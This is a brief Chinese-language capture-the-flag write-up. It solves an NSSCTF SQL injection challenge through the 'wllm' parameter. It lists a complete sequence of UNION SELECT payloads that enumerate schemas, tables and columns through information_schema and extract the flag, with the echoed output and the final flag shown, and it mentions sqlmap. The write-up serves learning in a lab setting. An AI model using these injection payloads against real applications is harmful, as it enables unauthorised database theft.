#SQL 注入

标题提示参数是`wllm`

```url
?wllm=2' union select 1,2,3--+

?wllm=2' union select 1,database(),3--+

?wllm=2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test_db'--+

?wllm=2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="test_tb"--+

?wllm=2' union select 1,flag,3 from test_tb--+
```

sqlmap 跑也是可以的

title 指出参数是 wllm

```sql
-1' union select 1,2,3%23
```

回显：
Your Login name:2  
Your Password:3

```sql
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata%23
```

回显：
Your Login name:2  
Your Password:information_schema,mysql,performance_schema,test,test_db

```sql
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'%23
```

回显：
Your Login name:2  
Your Password:test_tb,users

```sql
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'%23
```

回显：
Your Login name:2  
Your Password:id,flag

```sql
-1' union select 1,2,flag from test_tb%23
```

Your Login name:2  
Your Password:NSSCTF{50e86d3f-87b2-4026-8bbe-690783fd7b27}
